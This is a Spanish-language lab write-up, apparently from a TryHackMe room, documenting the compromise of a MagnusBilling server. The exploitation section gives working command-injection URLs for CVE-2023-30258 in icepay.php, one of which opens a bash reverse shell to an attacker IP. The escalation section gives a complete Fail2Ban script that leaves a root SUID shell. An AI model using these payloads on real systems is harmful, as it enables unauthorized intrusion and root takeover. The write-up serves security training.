## Documentación Ethical Hacking

### 1. Introducción

Se llevó a cabo un análisis de seguridad sobre una máquina accesible en la red interna de TryHackMe, con IP 10.10.154.92. El objetivo fue identificar vectores de ataque, explotar vulnerabilidades y obtener acceso privilegiado, documentando cada paso del proceso incluyendo intentos fallidos para futuras referencias.

---

### 2. Escaneo inicial

**Herramienta utilizada**: Nmap
**Comandos ejecutados**:
```
nmap -Pn -n -sS -p- --min-rate 5000 -oG nmap 10.10.154.92
nmap -sVC -p22,80,3306,5038 -oG os 10.10.154.92
```

**Resumen de resultados:**
```
22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.56 ((Debian))
3306/tcp  open  mysql   MariaDB (acceso no autorizado)
5038/tcp  open  asterisk Asterisk Call Manager 2.10.6
```

---

### 3. Enumeración

**HTTP (puerto 80):**
- Navegación web reveló una instancia del sistema MagnusBilling en la ruta `/mbilling`.
- Inspección de scripts JavaScript y rutas web no reveló archivos sensibles.
- `robots.txt`  no contenían información útil.

**MySQL (3306):** Acceso denegado, sin banners útiles.
**5038 – Asterisk AMI:** Servicio identificado pero sin autenticación anónima permitida.
**Búsqueda de vulnerabilidades:**
- `searchsploit` no arrojó resultados relevantes.
- Búsqueda manual en Google mostró una vulnerabilidad crítica:
    - **CVE-2023-30258**: MagnusBilling posee inyección de comandos no autenticada en `icepay.php`
        - https://attackerkb.com/topics/DFUJhaM5dL/cve-2023-30258

**Vectores fallidos:**
- Fuzzing manual en directorios y endpoints de MagnusBilling sin resultados positivos.
- Uso de gobuster y wfuzz no encontró rutas sensibles adicionales.

---
### 4. Explotación
**Exploit funcional:**
Prueba:
```
http://biling.thm/mbilling/lib/icepay/icepay.php?democ=/dev/null;sleep%203;ls%20a

http://biling.thm/mbilling/lib/icepay/icepay.php?democ=/dev/null;sleep%2030;ls%20a

http://biling.thm/mbilling/lib/icepay/icepay.php?democ=/dev/null;bash -c 'bash -i >& /dev/tcp/10.6.17.22/4444 0>&1'

http://biling.thm/mbilling/lib/icepay/icepay.php?democ=/dev/null;bash -c 'bash -i >& /dev/tcp/10.6.17.22/4444 0>&1';#
```
Exploit:
```
http://biling.thm/mbilling/lib/icepay/icepay.php?democ=/dev/null;bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/10.6.17.22/4444%200%3E%261';%23
```
**Shell inversa establecida:**
```
nc -lvnp 4444
```
**Mejora de TTY:**
```
Ctrl+Z
stty raw -echo && fg
script /dev/null -c bash
export TERM=xterm
reset
```

**Métodos fallidos de explotación:**
- Uso de payloads con `php-reverse-shell.php` sin éxito.
- Uso directo del módulo de Metasploit sin establecer sesión.

---
### 5. Escalada de privilegios
**Usuario inicial:** `asterisk`
**Evaluación de sudo:**
```
sudo -l
```
Resultado:
```
Defaults!/usr/bin/fail2ban-client !requiretty
```
**Restricciones:**
- No se podía escribir en `/etc/fail2ban` directamente (error de permisos).
- `nano` no permitía guardar cambios sin privilegios.

**Explotación exitosa mediante Fail2Ban:**  
Condiciones cumplidas:
- Se tenía permiso de escritura en `/etc/fail2ban/action.d`.
- Se podía reiniciar Fail2Ban mediante `sudo`.

**Procedimiento completo:**

Basado en esta escalamiento https://juggernaut-sec.com/fail2ban-lpe/
```bash
rsync -av /etc/fail2ban/ /tmp/fail2ban/

cat > /tmp/script <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/bash
chmod 755 /tmp/bash
chmod u+s /tmp/bash
EOF
chmod +x /tmp/script

cat > /tmp/fail2ban/action.d/demo.conf <<'EOF'
[Definition]
actionstart = /tmp/script
EOF

cat >> /tmp/fail2ban/jail.local <<'EOF'
[demo]
enabled = true
action = exploit
EOF

cat > /tmp/fail2ban/filter.d/demo.conf <<'EOF'
[Definition]
EOF

sudo fail2ban-client -c /tmp/fail2ban/ -v restart
```
**Root shell obtenida con:**
```
/tmp/bash -p
```
**Intentos fallidos de escalada:**
- Uso directo de `fail2ban-client set sshd action /tmp/...` resultó en error de validación.
- Edición directa de `iptables-multiport.conf` falló por permisos en sed temporal.

---
### 6. Hallazgos clave
- Acceso inicial no autenticado mediante vulnerabilidad crítica en `icepay.php` (CVE-2023-30258).
- Configuración insegura de Fail2Ban permitió escalar a root sin password.
- Bit SUID en `/tmp/bash` permitió acceso permanente como root tras reinicio del servicio.
---
### 7. Pasos siguientes
- Validar presencia de otras configuraciones SUID en el sistema.
- Revisar logs de `/var/log/auth.log` y `/var/log/fail2ban.log` para rastrear actividad del atacante.
- Eliminar `/tmp/bash` y restaurar configuración original de Fail2Ban.
---
### 8. Conclusión
La máquina fue comprometida a través de una vulnerabilidad conocida en MagnusBilling. Una vez dentro, se aprovechó una configuración insegura del servicio Fail2Ban para escalar privilegios. Este caso demuestra cómo una mala configuración de servicios comunes, combinada con software desactualizado, puede derivar en una toma total del sistema. Se recomienda:
- Aplicar parches de seguridad en MagnusBilling.
- Restringir permisos de escritura en `/etc/fail2ban`.
- Auditar configuraciones sudo y servicios con privilegios elevados.